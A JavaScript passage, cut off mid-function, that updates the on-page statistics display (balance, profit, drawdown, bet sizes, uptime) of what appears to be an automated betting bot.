    function updateHUD(){
        var bal = bot.balance;
        var profitVal = bal - bot.startBalance;
        var drawdown = bot.balhigh > 0 ? ((bot.balhigh - bal)/bot.balhigh)*100 : 0;
        var el = function(id,val){ var e=document.getElementById(id); if(e) e.innerText=val; };
        el('stat-balance', bal.toFixed(6));
        el('stat-profit', (profitVal>=0?'+':'') + profitVal.toFixed(6));
        el('stat-wager', bot.wager.toFixed(6));
        el('stat-drawdown', drawdown.toFixed(2) + '%');
        el('stat-maxbet', bot.highestBet.toFixed(8));
        el('stat-minbet', bot.minbet.toFixed(6));
        el('stat-username', bot.stakeUser);
        el('stat-currency', bot.selectedCurrency.toUpperCase());
        if(bot.isRunning && bot.startTime){
            var elapsed = (Date.now() - bot.startTime)/1000;
            var hrs = Math.floor(elapsed/3600);
            var mins = Math.floor((elapsed%3600)/60);
            var secs = Math.floor(elapsed%60);
            el('stat-uptime', hrs.toString().padStart(2,'0') + ':' + mins.toString().padStart(2,'0') + ':' + secs.toString().padStart(2,'0'));
